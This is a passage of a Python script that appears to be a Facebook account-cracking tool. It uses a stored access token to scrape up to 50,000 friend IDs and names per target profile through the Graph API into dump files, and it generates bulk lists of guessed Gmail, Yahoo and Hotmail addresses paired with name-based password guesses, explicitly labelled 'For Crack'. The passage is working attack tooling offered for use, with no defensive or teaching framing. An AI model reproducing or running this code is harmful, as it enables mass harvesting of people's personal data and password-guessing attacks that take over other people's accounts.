		fb_login()
	print("\n[01] Dump ID From 02 Public User ID [ Max : 10K ]")
	print("[02] Dump ID From 03 Public User ID [ Max : 15K ]")
	print("[03] Dump ID From 05 Public User ID [ Max : 25K ]")
	print("[04] Dump ID From 08 Public User ID [ Max : 40K ]")
	print("[05] Dump ID From 10 Public User ID [ Max : 50K ]")
	print("[06] Dump ID From 15 Public User ID [ Max : 75K ]")
	print("[07] Dump ID From 20 Public User ID [ Max : 100K ]")
	print("[08] Dump ID From 25 Public User ID [ Max : 125K ]")
	multi_pub = input("\n[>>] Choose : ")
	if multi_pub in ["1","01"]:
		fb_2x_dump()
	elif multi_pub in ["2","02"]:
		fb_x3_dump()
	elif multi_pub in ["3","03"]:
		fb_x5_dump()
	elif multi_pub in ["4","04"]:
		fb_x8_dump()
	elif multi_pub in ["5","05"]:
		fb_x10_dump()
	elif multi_pub in ["6","06"]:
		fb_x15_dump()
	elif multi_pub in ["7","07"]:
		fb_x20_dump()
	elif multi_pub in ["8","08"]:
		fb_x25_dump()
	else:
		time.sleep(2)
		fb_menu()
def fb_single_dump():
	logo()
	try:
		___token___ = open('Data/Facebook/Data/fb_token.txt','r').read()
	except:
		fb_login()
	try:
		token = open('Data/Facebook/Data/fb_token.txt','r').read()
		u = requests.get('https://graph.facebook.com/me?access_token='+token).text
		u1 = json.loads(u)
		name = u1['name']
	except KeyError:
		print('\n\n[*] Token Expired ')
		time.sleep(2.5)
		fb_login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	for zx in range(___total___):
		zx +=1
		___ids___ = input("[>>] Public User ID : ")
		if ___ids___ in ['',' ']:
			fb_menu()
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
			file = open('Data/Facebook/Dump/'+___file___+'.txt' , 'a')
			file2 = ('Data/Facebook/Dump/'+___file___+'.txt')
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Data/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_single_dump()
def email_dump():
	os.system("rm -rf Data/Facebook/Dump/email.txt")
	logo()
	print("[01] Dump Email Menual For Crack [ Digit : 03 ] ")
	print("[02] Dump Email Menual For Crack [ Digit : 04 ] ")
	print("[03] Dump Email Menual For Crack [ Digit : 05 ] ")
	print("[04] Dump Email Auto For Crack [ Digit : 03 ] ")
	print("[05] Dump Email Auto For Crack [ Digit : 04 ] ")
	print("[06] Dump Email Auto For Crack [ Digit : 05 ] ")
	ben = input("[->] Choose : ")
	if ben == "1" or ben == "01":
		___ = input("[>] Enter Email Username : ")
		domain = input("[>] Enter Domain Name : ")
		separator = input("[>] Enter ID And Name Separator : ")
		passusername = input("[>] Enter Full User Name With Space : ")
		try:
			lim_ = int(input("[>] Cracking Limit : "))
		except:lim_ = "5000"
		_             = 1
		__            = 999
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/email.txt', 'a')
				old_a.write(str(___)+str(bokeq)+domain+separator+passusername+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/email.txt File")
		input("\n\n[*] Back ")
		fb_menu()
	elif ben == "2" or ben == "02":
		___ = input("[>] Enter Email Username : ")
		domain = input("[>] Enter Domain Name : ")
		separator = input("[>] Enter ID And Name Separator : ")
		passusername = input("[>] Enter Full User Name With Space : ")
		try:
			lim_ = int(input("[>] Cracking Limit : "))
		except:lim_ = "5000"
		_             = 1
		__            = 9999
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/email.txt', 'a')
				old_a.write(str(___)+str(bokeq)+domain+separator+passusername+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/email.txt File")
		input("\n\n[*] Back ")
		fb_menu()
	elif ben == "3" or ben == "03":
		___ = input("[>] Enter Email Username : ")
		domain = input("[>] Enter Domain Name : ")
		separator = input("[>] Enter ID And Name Separator : ")
		passusername = input("[>] Enter Full User Name With Space : ")
		try:
			lim_ = int(input("[>] Cracking Limit : "))
		except:lim_ = "5000"
		_             = 1
		__            = 99999
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/email.txt', 'a')
				old_a.write(str(___)+str(bokeq)+domain+separator+passusername+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/email.txt File")
		input("\n\n[*] Back ")
		fb_menu()
	elif ben == "4" or ben == "04":
		___ = input("[>] Enter Email Username : ")
		print("[01] Dump Gmail For Crack")
		print("[02] Dump Yahoo Mail For Crack")
		print("[->] Dump Hot Mail For Crack")
		ch_dom = input("[->] Choose : ")
		if ch_dom in ['1','01']:
			domain = '@gmail.com'
		elif ch_dom in ['2','02']:
			domain = '@yahoo.com'
		elif ch_dom in ['3','03']:
			domain = '@hotmail.com'
		else:
			email_dump()
		separator = '|'
		passusername = input("[>] Enter Full User Name With Space : ")
		try:
			lim_ = int(input("[>] Cracking Limit : "))
		except:lim_ = "5000"
		_             = 1
		__            = 999
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/email.txt', 'a')
				old_a.write(str(___)+str(bokeq)+domain+separator+passusername+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/email.txt File")
		input("\n\n[*] Back ")
		fb_menu()
	elif ben == "5" or ben == "05":
		___ = input("[>] Enter Email Username : ")
		print("[01] Dump Gmail For Crack")
		print("[02] Dump Yahoo Mail For Crack")
		print("[->] Dump Hot Mail For Crack")
		ch_dom = input("[->] Choose : ")
		if ch_dom in ['1','01']:
			domain = '@gmail.com'
		elif ch_dom in ['2','02']:
			domain = '@yahoo.com'
		elif ch_dom in ['3','03']:
			domain = '@hotmail.com'
		else:
			email_dump()
		separator = '|'
		passusername = input("[>] Enter Full User Name With Space : ")
		try:
			lim_ = int(input("[>] Cracking Limit : "))
		except:lim_ = "5000"
		_             = 1
		__            = 9999
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/email.txt', 'a')
				old_a.write(str(___)+str(bokeq)+domain+separator+passusername+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/email.txt File")
		input("\n\n[*] Back ")
		fb_menu()
	elif ben == "6" or ben == "06":
		___ = input("[>] Enter Email Username : ")
		print("[01] Dump Gmail For Crack")
		print("[02] Dump Yahoo Mail For Crack")
		print("[->] Dump Hot Mail For Crack")
		ch_dom = input("[->] Choose : ")
		if ch_dom in ['1','01']:
			domain = '@gmail.com'
		elif ch_dom in ['2','02']:
			domain = '@yahoo.com'
		elif ch_dom in ['3','03']:
			domain = '@hotmail.com'
		else:
			email_dump()
		separator = '|'
		passusername = input("[>] Enter Full User Name With Space : ")
		try:
			lim_ = int(input("[>] Cracking Limit : "))
		except:lim_ = "5000"
		_             = 1
		__            = 99999
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/email.txt', 'a')
				old_a.write(str(___)+str(bokeq)+domain+separator+passusername+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/email.txt File")
		input("\n\n[*] Back ")
		fb_menu()
	else:
		fb_menu()
			
if __name__=='__main__':
	main_menu()
